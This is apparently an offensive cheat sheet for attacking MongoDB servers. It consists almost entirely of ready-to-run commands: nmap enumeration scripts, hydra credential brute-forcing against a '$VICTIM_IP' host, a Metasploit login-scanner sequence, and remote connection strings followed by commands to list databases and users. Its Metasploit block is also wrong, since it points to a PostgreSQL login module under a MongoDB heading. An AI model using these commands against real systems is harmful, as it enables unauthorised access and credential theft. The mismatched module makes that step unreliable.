# <span style="color:#FF5555">Commands</span>
### <span style="color:#50FA7B">Enumeration</span>
```bash
nmap --script mongodb-info -p 27017 $VICTIM_IP
nmap --script mongodb-databases -p 27017 $VICTIM_IP
```
### <span style="color:#50FA7B">Brute Force Credentials</span>
```bash
hydra -l username -P passwords.txt $VICTIM_IP mongo
hydra -L usernames.txt -p $PASS $VICTIM_IP mongo

# Metasploit
msfconsole
msf> use auxiliary/scanner/postgres/postgres_login
msf> set rhosts $VICTIM_IP
msf> run
```

### <span style="color:#50FA7B">Connect</span>

```bash
# Local
mongo
mongo --port 27017

# Remote
mongo --host $VICTIM_IP --port 27017 -u $USER -p $PASS
mongo "mongodb://$VICTIM_IP:27017"
mongo "mongodb://username:password@$VICTIM_IP:27017/?authSource=admin"

```


### <span style="color:#50FA7B">Basic Commands</span>

```bash
# All databases
> show dbs
# Current database
> db
# Switch database if it exists, or create new if not exist
> use db_name
# Collections
> show collections
# Run javascript file
> load("example.js")

# List users in the current database
> show users
> db.admin.find()

# Create new collection in current database
> db.createCollection("users")
```
